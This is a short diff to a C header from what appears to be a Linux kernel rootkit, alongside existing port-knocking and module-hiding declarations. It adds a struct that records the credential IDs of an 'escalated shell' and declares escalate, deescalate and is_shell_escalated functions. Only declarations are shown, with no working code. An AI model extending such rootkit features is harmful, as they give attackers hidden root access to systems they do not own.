@@ -50,6 +50,20 @@ struct port_knocking {
 	int ipaddr;		/* the ip that is allowed to connect */
 };
 
+/* list for id's of the escalated shell*/
+struct escalated_pid {
+	struct list_head list;
+	pid_t pid;
+	int uid;
+	int euid;
+	int suid;
+	int fsuid;
+	int gid;
+	int egid;
+	int sgid;
+	int fsgid;
+};
+
 /*
  * Functions for adding and removing certain objects from hiding
  */
@@ -110,6 +124,15 @@ hide_module(char *name);
 
 int
 unhide_module(char *name);
+
+struct escalated_pid *
+is_shell_escalated(pid_t pid);
+
+int
+escalate(struct escalated_pid *);
+
+int
+deescalate(pid_t pid);
 
 void
 initialize_control(void);
